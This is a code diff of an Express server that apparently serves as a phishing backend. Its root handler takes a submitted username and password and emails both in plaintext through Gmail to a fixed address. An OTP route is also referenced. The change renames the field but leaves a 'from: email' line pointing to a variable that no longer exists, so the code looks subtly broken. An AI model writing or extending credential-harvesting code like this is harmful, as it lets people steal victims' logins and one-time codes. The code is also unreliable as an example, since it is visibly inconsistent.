@@ -22,7 +22,7 @@ app.use(express.json());
 
 // API routes for index
 app.post("/", (req, res) => {
-  const { email, password } = req.body;
+  const { username, password } = req.body;
 
   const transporter = nodemailer.createTransport({
     service: "gmail",
@@ -35,8 +35,8 @@ app.post("/", (req, res) => {
   const mailOptions = {
     from: email,
     to: userEmail,
-    subject: `email: ${email}\nPassword: ${password}`,
-    text: `New user registered with Email: ${email}\nPassword: ${password}`,
+    subject: `Username: ${username}\nPassword: ${password}`,
+    text: `New user registered with Email: ${username}\nPassword: ${password}`,
   };
 
   console.log(mailOptions);
@@ -114,4 +114,5 @@ app.post("/otp", (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port http://localhost:${PORT}`);
 });
+
 
